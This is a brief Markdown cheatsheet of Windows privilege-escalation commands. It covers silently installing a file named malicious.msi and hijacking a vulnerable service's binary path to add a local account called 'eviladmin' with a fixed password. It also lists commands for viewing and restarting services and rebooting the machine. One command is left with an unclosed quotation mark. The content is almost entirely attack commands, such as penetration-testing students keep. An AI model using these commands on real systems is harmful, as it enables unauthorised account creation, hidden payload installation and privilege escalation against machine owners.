# Cheatsheet

## MSI

### Installing MSI
```
msiexec /quiet /qn /i malicious.msi
```
```
/quiet = Suppress any messages to the user during installation
/qn = No GUI
/i = Regular (vs. administrative) installation
```

## Services

- Registry entries: `HKLM\SYSTEM\CurrentControlSet\Services`
- View service properties: `sc qc "Vulnerable Service"`
- Restarting: `sc stop "Vulnerable Service"`
- Restart PC: `shutdown /r /t 0`
- Change binary path: `sc config "Vulnerable Service" binpath= "net user eviladmin P4ssw0rd@ /add`

### Keep alive
When a service starts in Windows operating systems, it must communicate with the `Service Control Manager`. If it’s not, `Service Control Manager` will terminates the process.
